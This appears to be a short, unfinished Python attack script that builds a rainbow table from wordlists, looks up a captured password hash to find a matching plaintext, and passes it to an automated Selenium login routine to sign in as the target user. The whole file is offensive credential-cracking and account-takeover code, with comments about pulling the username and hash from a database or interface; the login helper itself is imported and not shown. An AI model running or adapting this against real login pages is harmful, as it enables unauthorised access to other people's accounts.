import rainbowtables as rt
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from Cyber_Scripts import *


def create_table(wordlists, path="/rainbow_tables", file_name="rainbow_table", hash_type="sha256"):
    rt.set_directory(path, full_path=False)
    rt.set_filename(file_name)

    rt.create_directory()
    rt.create_file()
    rt.insert_wordlists(wordlists, hash_type, wordlist_encoding="utf-8", display_progress=True, compression=True)


# hashed is the hashed value of the real password
def hash_lookup(hashed, table="rainbow_table"):
    lookup = rt.search(hashed, table, full_path=True, time_took=True, compression=True)
    # false if search failed
    # else tuple plaintext and time took to find
    # plaintext is a password that gives the same hashed value like the original function
    return lookup


def execute(login_page_url, user_name, hashed, table="rainbow_table"):
    # table creation should happen prior to execution ??

    # extract relevant username and hashed password from db or from GUI

    # lookup the hash in the table
    fake_password = hash_lookup(hashed, table)

    # lookup successful -> go through login flow
    # try to login
    return enter_login_input(login_page_url, user_name, fake_password)